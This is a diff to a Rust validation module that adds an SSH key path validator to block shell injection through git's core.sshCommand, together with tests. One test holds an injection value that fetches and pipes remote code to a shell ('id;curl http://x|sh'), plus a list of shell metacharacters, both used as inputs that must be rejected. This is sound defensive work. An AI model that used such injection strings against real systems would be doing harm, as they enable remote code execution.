@@ -202,6 +202,74 @@ pub fn validate_name(name: &str) -> Result<String> {
     Ok(name.to_string())
 }
 
+/// Characters an SSH key path may contain once `~` has been expanded.
+///
+/// Spaces and a mid-path `~` are deliberately allowed: real macOS paths carry
+/// both (`~/Library/Mobile Documents/com~apple~CloudDocs/…`), and both emit
+/// sites quote the value, so neither can change how the path is read. What is
+/// excluded is everything a shell, ssh's `%`-token expansion, or ssh_config's
+/// quoting could reinterpret — none of which has a legitimate use in a path.
+fn ssh_path_char_ok(c: char) -> bool {
+    c.is_alphanumeric() || matches!(c, '/' | '.' | '_' | '-' | '+' | '@' | '~' | ' ')
+}
+
+/// Validate an SSH key path and return the `~`-contracted form to store.
+///
+/// This path is embedded in `core.sshCommand`, which git executes through a
+/// shell. [`fsx::sh_quote`](crate::fsx::sh_quote) is what actually makes that
+/// safe; this is the second layer, so that a hostile value cannot even be
+/// stored — `store::load` does not revalidate, and a future edit to the command
+/// string should not be able to reopen the hole on its own.
+pub fn validate_ssh_key_path(raw: &str) -> Result<String> {
+    // Handles empty, control characters, relative paths, `..`, and escapes
+    // outside $HOME. Reused rather than reimplemented.
+    let path = paths::expand_within_home(raw)?;
+
+    let text = path.to_str().ok_or_else(|| {
+        AppError::validation("key path contains characters this app cannot read")
+    })?;
+    if text.len() > 512 {
+        return Err(AppError::validation(
+            "key path must be 512 characters or fewer",
+        ));
+    }
+    if let Some(bad) = text.chars().find(|c| !ssh_path_char_ok(*c)) {
+        return Err(AppError::validation(format!(
+            "key path may not contain '{}' — use letters, digits, and '/._-+@~'",
+            bad.escape_default()
+        )));
+    }
+
+    let file_name = path
+        .file_name()
+        .and_then(|n| n.to_str())
+        .ok_or_else(|| AppError::validation("key path must name a file"))?;
+    if file_name.ends_with(".pub") {
+        return Err(AppError::validation(
+            "point this at the private key, not the .pub file",
+        ));
+    }
+
+    // Generating a key with overwrite deletes whatever is already at this path.
+    // None of these is a key, and losing any of them would be someone's bad day.
+    let reserved = [
+        paths::ssh_config_path()?,
+        paths::home()?.join(".ssh/known_hosts"),
+        paths::home()?.join(".ssh/authorized_keys"),
+        paths::gitconfig_path()?,
+        paths::store_path()?,
+        paths::home()?,
+    ];
+    if reserved.contains(&path) {
+        return Err(AppError::validation(format!(
+            "{} is not a key file — generating one here would destroy it",
+            paths::contract(&path)
+        )));
+    }
+
+    Ok(paths::contract(&path))
+}
+
 /// Normalized, validated form of a [`ProfileInput`].
 pub struct CleanInput {
     pub alias: String,
@@ -223,12 +291,7 @@ impl ProfileInput {
 
         // Keys must sit under $HOME; ssh(1) will not read them from anywhere
         // exotic anyway, and it keeps the writable surface small.
-        let key = paths::expand_within_home(&self.ssh_key_path)?;
-        if key.extension().is_some_and(|e| e == "pub") {
-            return Err(AppError::validation(
-                "point this at the private key, not the .pub file",
-            ));
-        }
+        let ssh_key_path = validate_ssh_key_path(&self.ssh_key_path)?;
 
         let mut dirs = Vec::new();
         for dir in &self.dirs {
@@ -248,7 +311,7 @@ impl ProfileInput {
             email,
             host_name,
             host_alias,
-            ssh_key_path: paths::contract(&key),
+            ssh_key_path,
             dirs,
         })
     }
@@ -261,6 +324,63 @@ pub fn now_iso() -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn ssh_key_path_rejects_shell_metacharacters() {
+        // This path is embedded in core.sshCommand, which git runs through a
+        // shell. Anything the shell could reinterpret has no business here.
+        for c in [
+            ';', '|', '&', '$', '`', '(', ')', '<', '>', '*', '?', '!', '#', '"', '\'', '\\', '%',
+            '{', '}', '[', ']', '^', '=', ':', ',', '\t',
+        ] {
+            let candidate = format!("~/.ssh/id{c}x");
+            assert!(
+                validate_ssh_key_path(&candidate).is_err(),
+                "{candidate:?} must be rejected"
+            );
+        }
+        // The payload this validator exists to stop.
+        assert!(validate_ssh_key_path("~/.ssh/id;curl http://x|sh").is_err());
+    }
+
+    #[test]
+    fn ssh_key_path_allows_real_world_paths() {
+        // Deliberate: both emit sites quote the value, so a space cannot change
+        // how it is read, and banning it would reject paths people really have.
+        // Do not "harden" this into rejecting them.
+        assert!(validate_ssh_key_path("~/.ssh/id_ed25519").is_ok());
+        assert!(validate_ssh_key_path("~/My Keys/id_ed25519").is_ok());
+        assert!(
+            validate_ssh_key_path("~/Library/Mobile Documents/com~apple~CloudDocs/id").is_ok(),
+            "iCloud paths carry both a space and a mid-path '~'"
+        );
+        assert!(validate_ssh_key_path("~/.ssh/id_josé").is_ok());
+        assert!(validate_ssh_key_path("~/.ssh/id+work@host").is_ok());
+    }
+
+    #[test]
+    fn ssh_key_path_refuses_to_target_something_precious() {
+        // Generating with overwrite deletes whatever is already at this path.
+        assert!(validate_ssh_key_path("~/.ssh/config").is_err());
+        assert!(validate_ssh_key_path("~/.ssh/known_hosts").is_err());
+        assert!(validate_ssh_key_path("~/.ssh/authorized_keys").is_err());
+        assert!(validate_ssh_key_path("~/.gitconfig").is_err());
+        assert!(validate_ssh_key_path("~").is_err());
+    }
+
+    #[test]
+    fn ssh_key_path_keeps_the_rules_it_already_had() {
+        assert!(validate_ssh_key_path("").is_err());
+        assert!(validate_ssh_key_path("relative/id").is_err());
+        assert!(validate_ssh_key_path("~/../outside/id").is_err());
+        assert!(validate_ssh_key_path("/etc/id").is_err());
+        assert!(validate_ssh_key_path("~/.ssh/id.pub").is_err());
+        // Stored in the portable ~ form, not as an absolute path.
+        assert_eq!(
+            validate_ssh_key_path("~/.ssh/id_work").unwrap(),
+            "~/.ssh/id_work"
+        );
+    }
 
     #[test]
     fn alias_charset_is_enforced() {
